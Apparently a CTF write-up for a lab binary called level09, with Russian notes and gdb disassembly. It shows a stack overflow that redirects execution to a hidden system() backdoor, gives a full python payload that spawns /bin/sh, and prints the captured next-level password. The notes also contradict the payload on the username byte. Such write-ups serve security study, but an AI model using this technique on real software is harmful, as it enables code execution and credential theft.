>info func
0x000055555555488c  secret_backdoor    //не вызывается 
0x00005555555548c0  handle_msg
0x0000555555554932  set_msg
0x00005555555549cd  set_username
0x0000555555554aa8  main

disas secret_backdoor
    вызывается system, причем с параметром из fgets 
        0x00005555555548a1 <+21>:	lea    -0x80(%rbp),%rax
        0x00005555555548a5 <+25>:	mov    $0x80,%esi
        0x00005555555548aa <+30>:	mov    %rax,%rdi
        0x00005555555548ad <+33>:	callq  0x555555554770 <fgets@plt>
        0x00005555555548b2 <+38>:	lea    -0x80(%rbp),%rax
        0x00005555555548b6 <+42>:	mov    %rax,%rdi
        0x00005555555548b9 <+45>:	callq  0x555555554740 <system@plt>

хотим переписать адрес возврата, чтобы перейти на secret_backdoor для handle_msg
1.
    считаем адрес возврата
    Dump of assembler code for function handle_msg:
    => 0x00005555555548c0 <+0>:	push   %rbp
    0x00005555555548c1 <+1>:	mov    %rsp,%rbp
    0x00005555555548c4 <+4>:	sub    $0xc0,%rsp
    0x00005555555548cb <+11>:	lea    -0xc0(%rbp),%rax     

    0xc0+8 = 200   


2. Как можем это сделать? есть 2 fgets:
    - в set_username
        здесь записываем 41 байт с адреса STRUCT + 0x8c
        и можем перезаписать    STRUCT + 0xb4  // 0xb4 = 0x8c+41

    - в set_msg
        записываем в STRUCT с помощью strncpy min (STRUCT + 0xb4, 0x400) символов
        Здесь и будем перезаписывать адрес возврата handle_msg, вначале записав в пункте 1 большое STRUCT + 0xff
        запись происходит на адрес 0x7fffffffe0b0:
            b *0x000055555555499d
                x/xw $rbp - 0x400
                0x7fffffffe0b0:	0x00000000

Чтобы дойти до адреса возврата 0x7fffffffe588 необходимо пройти от 0x7fffffffe0b0 число байт равное 
                                                        0x7fffffffe588 - 0x7fffffffe0b0 = 0x4D8 = 1240


Итог:
    в usernam пишем 'a'*40+0x000004D8[::-1]
    в messege 'a'*200 + 0x000055555555488c[::-1]
    затем в secret_backdoor подаем /bin/sh

(python -c "print 'A'*40 + '\xff' + '\n' + 'A' * 200 + '\x00\x00\x55\x55\x55\x55\x48\x8c'[::-1] + '\n' + '/bin/sh'"; cat) | ./level09

--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
ls
ls: cannot open directory .: Permission denied
whoami
end
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
                                                                                                        






